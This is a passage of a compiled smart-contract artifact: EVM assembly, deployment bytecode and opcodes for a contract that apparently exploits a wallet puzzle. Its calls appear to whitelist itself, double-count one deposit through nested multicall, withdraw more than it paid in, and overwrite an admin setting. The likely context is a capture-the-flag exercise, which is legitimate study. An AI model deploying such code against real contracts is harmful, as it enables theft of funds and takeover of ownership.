swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2809:3001   */\n    tag_68:\n        /* \"#utility.yul\":2896:2906   */\n      0x00\n        /* \"#utility.yul\":2931:2995   */\n      tag_111\n        /* \"#utility.yul\":2991:2994   */\n      dup4\n        /* \"#utility.yul\":2983:2989   */\n      dup4\n        /* \"#utility.yul\":2931:2995   */\n      tag_67\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":2917:2995   */\n      swap1\n      pop\n        /* \"#utility.yul\":2809:3001   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3007:3129   */\n    tag_69:\n        /* \"#utility.yul\":3086:3090   */\n      0x00\n        /* \"#utility.yul\":3118:3122   */\n      0x20\n        /* \"#utility.yul\":3113:3116   */\n      dup3\n        /* \"#utility.yul\":3109:3123   */\n      add\n        /* \"#utility.yul\":3101:3123   */\n      swap1\n      pop\n        /* \"#utility.yul\":3007:3129   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3161:4144   */\n    tag_70:\n        /* \"#utility.yul\":3298:3301   */\n      0x00\n        /* \"#utility.yul\":3327:3390   */\n      tag_114\n        /* \"#utility.yul\":3384:3389   */\n      dup3\n        /* \"#utility.yul\":3327:3390   */\n      tag_60\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":3406:3501   */\n      tag_115\n        /* \"#utility.yul\":3494:3500   */\n      dup2\n        /* \"#utility.yul\":3489:3492   */\n      dup6\n        /* \"#utility.yul\":3406:3501   */\n      tag_61\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":3399:3501   */\n      swap4\n      pop\n        /* \"#utility.yul\":3527:3530   */\n      dup4\n        /* \"#utility.yul\":3572:3576   */\n      0x20\n        /* \"#utility.yul\":3564:3570   */\n      dup3\n        /* \"#utility.yul\":3560:3577   */\n      mul\n        /* \"#utility.yul\":3555:3558   */\n      dup6\n        /* \"#utility.yul\":3551:3578   */\n      add\n        /* \"#utility.yul\":3602:3667   */\n      tag_116\n        /* \"#utility.yul\":3661:3666   */\n      dup6\n        /* \"#utility.yul\":3602:3667   */\n      tag_62\n      jump\t// in\n    tag_116:\n        /* \"#utility.yul\":3690:3697   */\n      dup1\n        /* \"#utility.yul\":3721:3722   */\n      0x00\n        /* \"#utility.yul\":3706:4099   */\n    tag_117:\n        /* \"#utility.yul\":3731:3737   */\n      dup6\n        /* \"#utility.yul\":3728:3729   */\n      dup2\n        /* \"#utility.yul\":3725:3738   */\n      lt\n        /* \"#utility.yul\":3706:4099   */\n      iszero\n      tag_119\n      jumpi\n        /* \"#utility.yul\":3802:3811   */\n      dup5\n        /* \"#utility.yul\":3796:3800   */\n      dup5\n        /* \"#utility.yul\":3792:3812   */\n      sub\n        /* \"#utility.yul\":3787:3790   */\n      dup10\n        /* \"#utility.yul\":3780:3813   */\n      mstore\n        /* \"#utility.yul\":3853:3859   */\n      dup2\n        /* \"#utility.yul\":3847:3860   */\n      mload\n        /* \"#utility.yul\":3881:3963   */\n      tag_120\n        /* \"#utility.yul\":3958:3962   */\n      dup6\n        /* \"#utility.yul\":3943:3956   */\n      dup3\n        /* \"#utility.yul\":3881:3963   */\n      tag_68\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":3873:3963   */\n      swap5\n      pop\n        /* \"#utility.yul\":3986:4055   */\n      tag_121\n        /* \"#utility.yul\":4048:4054   */\n      dup4\n        /* \"#utility.yul\":3986:4055   */\n      tag_69\n      jump\t// in\n    tag_121:\n        /* \"#utility.yul\":3976:4055   */\n      swap3\n      pop\n        /* \"#utility.yul\":4084:4088   */\n      0x20\n        /* \"#utility.yul\":4079:4082   */\n      dup11\n        /* \"#utility.yul\":4075:4089   */\n      add\n        /* \"#utility.yul\":4068:4089   */\n      swap10\n      pop\n        /* \"#utility.yul\":3766:4099   */\n      pop\n        /* \"#utility.yul\":3753:3754   */\n      0x01\n        /* \"#utility.yul\":3750:3751   */\n      dup2\n        /* \"#utility.yul\":3746:3755   */\n      add\n        /* \"#utility.yul\":3741:3755   */\n      swap1\n      pop\n        /* \"#utility.yul\":3706:4099   */\n      jump(tag_117)\n    tag_119:\n        /* \"#utility.yul\":3710:3724   */\n      pop\n        /* \"#utility.yul\":4115:4119   */\n      dup3\n        /* \"#utility.yul\":4108:4119   */\n      swap8\n      pop\n        /* \"#utility.yul\":4135:4138   */\n      dup8\n        /* \"#utility.yul\":4128:4138   */\n      swap6\n      pop\n        /* \"#utility.yul\":3303:4144   */\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"#utility.yul\":3161:4144   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4150:4559   */\n    tag_29:\n        /* \"#utility.yul\":4311:4315   */\n      0x00\n        /* \"#utility.yul\":4349:4351   */\n      0x20\n        /* \"#utility.yul\":4338:4347   */\n      dup3\n        /* \"#utility.yul\":4334:4352   */\n      add\n        /* \"#utility.yul\":4326:4352   */\n      swap1\n      pop\n        /* \"#utility.yul\":4398:4407   */\n      dup2\n        /* \"#utility.yul\":4392:4396   */\n      dup2\n        /* \"#utility.yul\":4388:4408   */\n      sub\n        /* \"#utility.yul\":4384:4385   */\n      0x00\n        /* \"#utility.yul\":4373:4382   */\n      dup4\n        /* \"#utility.yul\":4369:4386   */\n      add\n        /* \"#utility.yul\":4362:4409   */\n      mstore\n        /* \"#utility.yul\":4426:4552   */\n      tag_123\n        /* \"#utility.yul\":4547:4551   */\n      dup2\n        /* \"#utility.yul\":4538:4544   */\n      dup5\n        /* \"#utility.yul\":4426:4552   */\n      tag_70\n      jump\t// in\n    tag_123:\n        /* \"#utility.yul\":4418:4552   */\n      swap1\n      pop\n        /* \"#utility.yul\":4150:4559   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4565:4661   */\n    tag_71:\n        /* \"#utility.yul\":4602:4609   */\n      0x00\n        /* \"#utility.yul\":4631:4655   */\n      tag_125\n        /* \"#utility.yul\":4649:4654   */\n      dup3\n        /* \"#utility.yul\":4631:4655   */\n      tag_54\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":4620:4655   */\n      swap1\n      pop\n        /* \"#utility.yul\":4565:4661   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4667:4785   */\n    tag_72:\n        /* \"#utility.yul\":4754:4778   */\n      tag_127\n        /* \"#utility.yul\":4772:4777   */\n      dup2\n        /* \"#utility.yul\":4754:4778   */\n      tag_71\n      jump\t// in\n    tag_127:\n        /* \"#utility.yul\":4749:4752   */\n      dup3\n        /* \"#utility.yul\":4742:4779   */\n      mstore\n        /* \"#utility.yul\":4667:4785   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4791:5013   */\n    tag_36:\n        /* \"#utility.yul\":4884:4888   */\n      0x00\n        /* \"#utility.yul\":4922:4924   */\n      0x20\n        /* \"#utility.yul\":4911:4920   */\n      dup3\n        /* \"#utility.yul\":4907:4925   */\n      add\n        /* \"#utility.yul\":4899:4925   */\n      swap1\n      pop\n        /* \"#utility.yul\":4935:5006   */\n      tag_129\n        /* \"#utility.yul\":5003:5004   */\n      0x00\n        /* \"#utility.yul\":4992:5001   */\n      dup4\n        /* \"#utility.yul\":4988:5005   */\n      add\n        /* \"#utility.yul\":4979:4985   */\n      dup5\n        /* \"#utility.yul\":4935:5006   */\n      tag_72\n      jump\t// in\n    tag_129:\n        /* \"#utility.yul\":4791:5013   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5019:5119   */\n    tag_73:\n        /* \"#utility.yul\":5079:5086   */\n      0x00\n        /* \"#utility.yul\":5108:5113   */\n      dup2\n        /* \"#utility.yul\":5097:5113   */\n      swap1\n      pop\n        /* \"#utility.yul\":5019:5119   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5125:5202   */\n    tag_74:\n        /* \"#utility.yul\":5162:5169   */\n      0x00\n        /* \"#utility.yul\":5191:5196   */\n      dup2\n        /* \"#utility.yul\":5180:5196   */\n      swap1\n      pop\n        /* \"#utility.yul\":5125:5202   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5208:5396   */\n    tag_75:\n        /* \"#utility.yul\":5281:5290   */\n      0x00\n        /* \"#utility.yul\":5314:5390   */\n      tag_133\n        /* \"#utility.yul\":5332:5389   */\n      tag_134\n        /* \"#utility.yul\":5341:5388   */\n      tag_135\n        /* \"#utility.yul\":5382:5387   */\n      dup5\n        /* \"#utility.yul\":5341:5388   */\n      tag_73\n      jump\t// in\n    tag_135:\n        /* \"#utility.yul\":5332:5389   */\n      tag_55\n      jump\t// in\n    tag_134:\n        /* \"#utility.yul\":5314:5390   */\n      tag_74\n      jump\t// in\n    tag_133:\n        /* \"#utility.yul\":5301:5390   */\n      swap1\n      pop\n        /* \"#utility.yul\":5208:5396   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5402:5579   */\n    tag_76:\n        /* \"#utility.yul\":5512:5572   */\n      tag_137\n        /* \"#utility.yul\":5566:5571   */\n      dup2\n        /* \"#utility.yul\":5512:5572   */\n      tag_75\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":5507:5510   */\n      dup3\n        /* \"#utility.yul\":5500:5573   */\n      mstore\n        /* \"#utility.yul\":5402:5579   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5585:5753   */\n    tag_77:\n        /* \"#utility.yul\":5668:5679   */\n      0x00\n        /* \"#utility.yul\":5702:5708   */\n      dup3\n        /* \"#utility.yul\":5697:5700   */\n      dup3\n        /* \"#utility.yul\":5690:5709   */\n      mstore\n        /* \"#utility.yul\":5742:5746   */\n      0x20\n        /* \"#utility.yul\":5737:5740   */\n      dup3\n        /* \"#utility.yul\":5733:5747   */\n      add\n        /* \"#utility.yul\":5718:5747   */\n      swap1\n      pop\n        /* \"#utility.yul\":5585:5753   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5759:5873   */\n    tag_78:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5879:6241   */\n    tag_79:\n        /* \"#utility.yul\":6020:6023   */\n      0x00\n        /* \"#utility.yul\":6041:6106   */\n      tag_141\n        /* \"#utility.yul\":6104:6105   */\n      0x00\n        /* \"#utility.yul\":6099:6102   */\n      dup4\n        /* \"#utility.yul\":6041:6106   */\n      tag_77\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":6034:6106   */\n      swap2\n      pop\n        /* \"#utility.yul\":6115:6208   */\n      tag_142\n        /* \"#utility.yul\":6204:6207   */\n      dup3\n        /* \"#utility.yul\":6115:6208   */\n      tag_78\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":6233:6234   */\n      0x00\n        /* \"#utility.yul\":6228:6231   */\n      dup3\n        /* \"#utility.yul\":6224:6235   */\n      add\n        /* \"#utility.yul\":6217:6235   */\n      swap1\n      pop\n        /* \"#utility.yul\":5879:6241   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6247:6930   */\n    tag_45:\n        /* \"#utility.yul\":6491:6495   */\n      0x00\n        /* \"#utility.yul\":6529:6531   */\n      0x60\n        /* \"#utility.yul\":6518:6527   */\n      dup3\n        /* \"#utility.yul\":6514:6532   */\n      add\n        /* \"#utility.yul\":6506:6532   */\n      swap1\n      pop\n        /* \"#utility.yul\":6542:6613   */\n      tag_144\n        /* \"#utility.yul\":6610:6611   */\n      0x00\n        /* \"#utility.yul\":6599:6608   */\n      dup4\n        /* \"#utility.yul\":6595:6612   */\n      add\n        /* \"#utility.yul\":6586:6592   */\n      dup6\n        /* \"#utility.yul\":6542:6613   */\n      tag_72\n      jump\t// in\n    tag_144:\n        /* \"#utility.yul\":6623:6718   */\n      tag_145\n        /* \"#utility.yul\":6714:6716   */\n      0x20\n        /* \"#utility.yul\":6703:6712   */\n      dup4\n        /* \"#utility.yul\":6699:6717   */\n      add\n        /* \"#utility.yul\":6690:6696   */\n      dup5\n        /* \"#utility.yul\":6623:6718   */\n      tag_76\n      jump\t// in\n    tag_145:\n        /* \"#utility.yul\":6765:6774   */\n      dup2\n        /* \"#utility.yul\":6759:6763   */\n      dup2\n        /* \"#utility.yul\":6755:6775   */\n      sub\n        /* \"#utility.yul\":6750:6752   */\n      0x40\n        /* \"#utility.yul\":6739:6748   */\n      dup4\n        /* \"#utility.yul\":6735:6753   */\n      add\n        /* \"#utility.yul\":6728:6776   */\n      mstore\n        /* \"#utility.yul\":6793:6923   */\n      tag_146\n        /* \"#utility.yul\":6918:6922   */\n      dup2\n        /* \"#utility.yul\":6793:6923   */\n      tag_79\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":6785:6923   */\n      swap1\n      pop\n        /* \"#utility.yul\":6247:6930   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6936:7054   */\n    tag_80:\n        /* \"#utility.yul\":7023:7047   */\n      tag_148\n        /* \"#utility.yul\":7041:7046   */\n      dup2\n        /* \"#utility.yul\":7023:7047   */\n      tag_74\n      jump\t// in\n    tag_148:\n        /* \"#utility.yul\":7018:7021   */\n      dup3\n        /* \"#utility.yul\":7011:7048   */\n      mstore\n        /* \"#utility.yul\":6936:7054   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7060:7282   */\n    tag_50:\n        /* \"#utility.yul\":7153:7157   */\n      0x00\n        /* \"#utility.yul\":7191:7193   */\n      0x20\n        /* \"#utility.yul\":7180:7189   */\n      dup3\n        /* \"#utility.yul\":7176:7194   */\n      add\n        /* \"#utility.yul\":7168:7194   */\n      swap1\n      pop\n        /* \"#utility.yul\":7204:7275   */\n      tag_150\n        /* \"#utility.yul\":7272:7273   */\n      0x00\n        /* \"#utility.yul\":7261:7270   */\n      dup4\n        /* \"#utility.yul\":7257:7274   */\n      add\n        /* \"#utility.yul\":7248:7254   */\n      dup5\n        /* \"#utility.yul\":7204:7275   */\n      tag_80\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":7060:7282   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220cdb8a6f8f98cf9637caead50e2c6f63b4096a638f33dcc006d34cca0c6064d6564736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b506040516109d33803806109d3833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6108c78061010c5f395ff3fe60806040526004361061002c575f3560e01c8063521eb2731461002f578063c0406226146100595761002d565b5b005b34801561003a575f80fd5b5061004361006f565b60405161005091906105c3565b60405180910390f35b348015610064575f80fd5b5061006d610092565b005b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f600167ffffffffffffffff8111156100ae576100ad6105dc565b5b6040519080825280602002602001820160405280156100e157816020015b60608152602001906001900390816100cc5790505b5090505f8054906101000a90505063d0e30db060e01b604051602401604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050815f8151811061016d5761016c610609565b5b60200260200101819052505f600267ffffffffffffffff811115610194576101936105dc565b5b6040519080825280602002602001820160405280156101c757816020015b60608152602001906001900390816101b25790505b5090505f8054906101000a90505063ac9650d860e01b826040516024016101ee9190610761565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050815f8151811061025e5761025d610609565b5b60200260200101819052505f8054906101000a90505063ac9650d860e01b8260405160240161028d9190610761565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050816001815181106102fe576102fd610609565b5b60200260200101819052505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e43252d7306040518263ffffffff1660e01b815260040161036191906107a1565b5f604051808303815f87803b158015610378575f80fd5b505af115801561038a573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ac9650d866038d7ea4c68000836040518363ffffffff1660e01b81526004016103ee9190610761565b5f604051808303818588803b158015610405575f80fd5b505af1158015610417573d5f803e3d5ffd5b50505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b61d27f63066071afd498d00006040518363ffffffff1660e01b815260040161047d92919061082f565b5f604051808303815f87803b158015610494575f80fd5b505af11580156104a6573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639d51d9b73373ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016105189190610878565b5f604051808303815f87803b15801561052f575f80fd5b505af1158015610541573d5f803e3d5ffd5b505050505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61058b61058661058184610549565b610568565b610549565b9050919050565b5f61059c82610571565b9050919050565b5f6105ad82610592565b9050919050565b6105bd816105a3565b82525050565b5f6020820190506105d65f8301846105b4565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f81519050919050565b5f82825260208201905092915050565b5f819050602082019050919050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f6106a18261065f565b6106ab8185610669565b93506106bb818560208601610679565b6106c481610687565b840191505092915050565b5f6106da8383610697565b905092915050565b5f602082019050919050565b5f6106f882610636565b6107028185610640565b93508360208202850161071485610650565b805f5b8581101561074f578484038952815161073085826106cf565b945061073b836106e2565b925060208a01995050600181019050610717565b50829750879550505050505092915050565b5f6020820190508181035f83015261077981846106ee565b905092915050565b5f61078b82610549565b9050919050565b61079b81610781565b82525050565b5f6020820190506107b45f830184610792565b92915050565b5f819050919050565b5f819050919050565b5f6107e66107e16107dc846107ba565b610568565b6107c3565b9050919050565b6107f6816107cc565b82525050565b5f82825260208201905092915050565b50565b5f61081a5f836107fc565b91506108258261080c565b5f82019050919050565b5f6060820190506108425f830185610792565b61084f60208301846107ed565b81810360408301526108608161080f565b90509392505050565b610872816107c3565b82525050565b5f60208201905061088b5f830184610869565b9291505056fea2646970667358221220cdb8a6f8f98cf9637caead50e2c6f63b4096a638f33dcc006d34cca0c6064d6564736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x9D3 CODESIZE SUB DUP1 PUSH2 0x9D3 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x8C7 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x521EB273 EQ PUSH2 0x2F JUMPI DUP1 PUSH4 0xC0406226 EQ PUSH2 0x59 JUMPI PUSH2 0x2D JUMP JUMPDEST JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3A JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x43 PUSH2 0x6F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x5C3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x64 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x6D PUSH2 0x92 JUMP JUMPDEST STOP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH1 0x1 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xAE JUMPI PUSH2 0xAD PUSH2 0x5DC JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xE1 JUMPI DUP2 PUSH1 0x20 ADD JUMPDEST PUSH1 0x60 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 PUSH1 0x1 SWAP1 SUB SWAP1 DUP2 PUSH2 0xCC JUMPI SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 POP POP PUSH4 0xD0E30DB0 PUSH1 0xE0 SHL PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP DUP2 PUSH0 DUP2 MLOAD DUP2 LT PUSH2 0x16D JUMPI PUSH2 0x16C PUSH2 0x609 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 SWAP1 MSTORE POP PUSH0 PUSH1 0x2 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x194 JUMPI PUSH2 0x193 PUSH2 0x5DC JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x1C7 JUMPI DUP2 PUSH1 0x20 ADD JUMPDEST PUSH1 0x60 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 PUSH1 0x1 SWAP1 SUB SWAP1 DUP2 PUSH2 0x1B2 JUMPI SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 POP POP PUSH4 0xAC9650D8 PUSH1 0xE0 SHL DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x1EE SWAP2 SWAP1 PUSH2 0x761 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP DUP2 PUSH0 DUP2 MLOAD DUP2 LT PUSH2 0x25E JUMPI PUSH2 0x25D PUSH2 0x609 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 SWAP1 MSTORE POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 POP POP PUSH4 0xAC9650D8 PUSH1 0xE0 SHL DUP3 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x28D SWAP2 SWAP1 PUSH2 0x761 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP1 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x2FE JUMPI PUSH2 0x2FD PUSH2 0x609 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 SWAP1 MSTORE POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE43252D7 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x361 SWAP2 SWAP1 PUSH2 0x7A1 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x378 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x38A JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xAC9650D8 PUSH7 0x38D7EA4C68000 DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3EE SWAP2 SWAP1 PUSH2 0x761 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x405 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x417 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB61D27F6 ADDRESS PUSH7 0x71AFD498D0000 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x47D SWAP3 SWAP2 SWAP1 PUSH2 0x82F JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 